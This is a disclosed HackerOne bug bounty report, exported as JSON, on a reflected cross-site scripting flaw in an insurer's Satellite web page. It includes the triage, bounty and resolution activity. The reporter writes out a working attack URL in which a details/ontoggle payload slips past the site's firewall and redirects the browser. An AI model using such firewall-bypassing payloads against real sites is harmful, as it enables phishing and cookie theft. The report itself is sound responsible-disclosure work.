{"id":301680,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE2ODA=","url":"https://hackerone.com/reports/301680","title":"Reflected XSS Vulnerability in https://www.lahitapiola.fi/cs/Satellite","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-01-01T20:16:24.756Z","submitted_at":"2018-01-01T20:16:24.756Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"teemuk","url":"/teemuk","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-04-11T06:34:46.473Z","bug_reporter_agreed_on_going_public_at":"2018-04-11T06:34:46.365Z","team_member_agreed_on_going_public_at":"2018-04-09T20:17:53.854Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** Reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite.`\n\n**Description:** There exists a reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav`. Value of query string parameter `rendermode` is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using `onToggle` event in `\u003cdetails\u003e` HTML element. The javascript that is used to demonstrate the vulnerability is `location.href=\"https://www.google.com/?q=\"+document.domain`. This demonstrates an open redirect type of vulnerability where user's browser is redirected to the attacker page where the attacker can e.g. perform phishing.\n\n**Domain:** `www.lahitapiola.fi`\n\n## Browsers / Apps Verified In:\n\n  * Firefox version 57.0.3\n\n## Steps To Reproduce:\n\nAccess the attack URL `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav\u0026rendermode=preview\"\u003e\u003cdetails%20open=true%20ontoggle=%27location.href=\"https://www.google.com/?q=\"%2Bdocument.domain%27\u003e\u003csummary\u003etesting\u003c/summary\u003e\u003c/details\u003e`\nBrowser is redirected to `https://www.google.com/?q=www.lahitapiola.fi`.\n\n## Additional material\n\n* N/A\n\n## Related reports, best practices\n\nThis vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. #170532)\n\n## Impact\n\nAn attacker can use reflected XSS vulnerabilities to inject content to pages served from `www.lahitapiola.fi`. This can be used e.g. for phishing purposes or to e.g. steal cookies from user's browser.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["tk0","harry_mg","eveeez","whitesector","japz","666reda"],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":1045,"asset_type":"URL","asset_identifier":"www.lahitapiola.fi","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2255202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report*","automated_response":false,"created_at":"2018-01-02T04:30:47.576Z","updated_at":"2018-01-02T04:30:47.576Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2379656,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This issue has mysteriously disappeared after a systems software upgrade.","automated_response":false,"created_at":"2018-02-13T17:46:33.589Z","updated_at":"2018-02-13T17:46:33.589Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2442568,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-02-28T11:48:44.061Z","updated_at":"2018-02-28T11:48:44.061Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"teemuk","url":"/teemuk"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2442570,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the report.","automated_response":false,"created_at":"2018-02-28T11:49:06.122Z","updated_at":"2018-02-28T11:49:06.122Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"teemuk","url":"/teemuk"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2583192,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We can have full disclosure.","automated_response":false,"created_at":"2018-04-09T20:17:53.882Z","updated_at":"2018-04-09T20:17:53.882Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2588973,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-04-11T06:34:46.411Z","updated_at":"2018-04-11T06:34:46.411Z","actor":{"username":"teemuk","cleared":false,"url":"/teemuk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2588974,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-04-11T06:34:46.506Z","updated_at":"2018-04-11T06:34:46.506Z","actor":{"username":"teemuk","cleared":false,"url":"/teemuk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":7062,"category":"team","content":"##Issue\nThe reporter found a reflected XXS in the Satellite server.\n\n##Fix\n\nWhile the issue was investigated, there were some backend updates done which apparently automatically mysteriously fixed the issue. Poof.\n\n##Reasoning\n\nBased on the report, the issue was found to be valid. Working single click open redirects which are easily usable in phishing attacks are always an issue for us. ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}